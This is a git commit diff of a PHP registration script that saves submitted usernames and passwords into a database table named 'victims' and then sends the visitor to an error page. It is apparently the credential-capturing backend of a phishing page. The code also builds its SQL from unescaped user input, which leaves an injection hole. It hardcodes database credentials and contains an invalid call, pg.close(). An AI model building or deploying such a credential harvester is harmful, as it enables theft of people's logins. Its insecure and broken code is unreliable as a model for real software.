6b24e178a3487eef205e46da05ca8e7cbe8d978e
Enrique <java.zone.in.out@gmail.com>
2022-03-26 21:42:59 -0600

    Haciendo modificaciones a BD

--- register.php
+++ register.php
@@ -1,19 +1,27 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
 <?php
+    $dbconection = pg_connect("host=192.168.100.193 port=25000 dbname=DB_Proyecto user=DB_Proyecto password=DB_Proyecto");       
 
-$id = 1;
-$usuario = $_POST['user'];
-$contrasena = $_POST['pass'];
+    $id = 0;
+    $usuario = $_POST["user"];
+    $contrasena = $_POST["pass"];
 
-//Conectándose a la base de datos
-$dbconection = pg_connect("host=localhost port=25000 dbname=DB_Proyecto user=DB_Proyecto password=1234")
-or die ("Hubo un error al conectarse con la base de datos.").preg_last_error();
+    $id = $id + 1 ;
+    $query = ("INSERT INTO victims (Id, Username, Password) VALUES ($id, $usuario, $contrasena)");
 
-//Petición de registro
-$query = ("INSERT INTO Victims (Id, Username, Password) VALUES ($id, $usuario, $contrasena)");
+    $registro = pg_query($dbconection, $query);
 
-//Registro
-$registro = pg_query($dbconection, $query) or die ('Error al ingresar, intente de nuevo.').pg_last_error();
+    pg.close();
 
-pg.close();
-
-?>
+    header('Location: error.html');
+?>    
+</body>
+</html>
